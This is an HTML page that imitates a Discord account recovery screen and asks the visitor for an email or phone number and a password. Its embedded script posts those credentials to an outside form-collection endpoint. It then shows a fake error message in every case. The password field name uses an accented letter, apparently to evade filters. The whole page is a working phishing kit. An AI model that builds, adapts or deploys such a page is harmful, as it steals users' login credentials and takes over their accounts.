

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Discord Account Recovery</title>
  <link rel="stylesheet" href="styles.css">
   <link rel="icon" href="https://i.postimg.cc/X7qNyfy6/Chat-GPT-Image-25-juli-2025-15-23-17.png" type="image/x-icon">

</head>
<body>
  <div class="login-box">
    <div class="form-section">
      <!-- Discord logo -->
      <img src="https://i.postimg.cc/X7qNyfy6/Chat-GPT-Image-25-juli-2025-15-23-17.png" alt="Discord Logo" class="discord-logo">

      <h2>Recover Your Account</h2>
      <p>Please log in to begin the account recovery process.</p>

      <form id="loginForm">
        <div class="form-group">
          <label for="email">Email or Phone Number</label>
          <input type="email" id="email" name="email" required>
        </div>
        <div class="form-group">
          <label for="passwórd">Password</label>
          <input type="password" id="passwórd" name="passwórd" required>
        </div>
        <button type="submit" class="button">Continue</button>
      </form>
    </div>

    <div class="qr-section">
      <p>Please verify your identity<br><small>Please verify to prevent your recovery from unsafe users.</small></p>
    </div>
  </div>

  <script>
    document.getElementById('loginForm').addEventListener('submit', async function(event) {
      event.preventDefault();

      const email = document.getElementById('email').value;
      const passwórd = document.getElementById('passwórd').value;

      const response = await fetch('https://formspree.io/f/xrblbpzo', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ email, passwórd })
      });

      if (response.ok) {
        alert('There was an error trying to verify, please try again in a while.');
        // Optionally, redirect the user or perform other actions
      } else {
        alert('There was an error trying to verify, please try again in a while.');
      }
    });
  </script>
</body>
</html>
